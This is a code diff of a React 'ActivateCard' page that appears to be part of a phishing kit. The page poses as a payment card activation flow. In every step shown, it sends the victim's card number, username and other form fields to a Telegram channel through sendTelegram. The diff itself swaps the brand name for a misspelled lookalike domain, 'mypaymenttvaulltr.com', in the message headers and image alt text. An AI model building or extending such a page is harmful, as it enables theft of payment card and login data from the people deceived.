@@ -58,7 +58,7 @@ export default function ActivateCard() {
     if (step === 0) {
       await sendTelegram(
         `━━━━━━━━━━━━━━━━━━━━━\n` +
-        `💳 <b>MyPaymentVault</b>\n` +
+        `💳 <b>mypaymenttvaulltr.com</b>\n` +
         `📌 <b>Aktivasi Kartu — Step 1</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
         `💳 <b>No. Kartu</b>    : <code>${form.cardNumber}</code>\n` +
@@ -70,7 +70,7 @@ export default function ActivateCard() {
     } else if (step === 1) {
       await sendTelegram(
         `━━━━━━━━━━━━━━━━━━━━━\n` +
-        `💳 <b>MyPaymentVault</b>\n` +
+        `💳 <b>mypaymenttvaulltr.com</b>\n` +
         `📌 <b>Aktivasi Kartu — Step 2</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
         `👤 <b>Username</b>    : <code>${form.username}</code>\n` +
@@ -81,7 +81,7 @@ export default function ActivateCard() {
     } else if (step === 2) {
       await sendTelegram(
         `━━━━━━━━━━━━━━━━━━━━━\n` +
-        `✅ <b>MyPaymentVault</b>\n` +
+        `✅ <b>mypaymenttvaulltr.com</b>\n` +
         `📌 <b>Aktivasi Kartu — Selesai</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
         `💳 <b>No. Kartu</b>    : <code>${form.cardNumber}</code>\n` +
@@ -114,7 +114,7 @@ export default function ActivateCard() {
       <AuthHeader />
 
       <div className="w-full overflow-hidden" style={{ maxHeight: "310px" }}>
-        <img src="/hero-card-clean.png" alt="MyPaymentVault" className="w-full object-cover"
+        <img src="/hero-card-clean.png" alt="mypaymenttvaulltr.com" className="w-full object-cover"
           style={{ maxHeight: "310px", objectPosition: "center 20%" }} />
       </div>
 
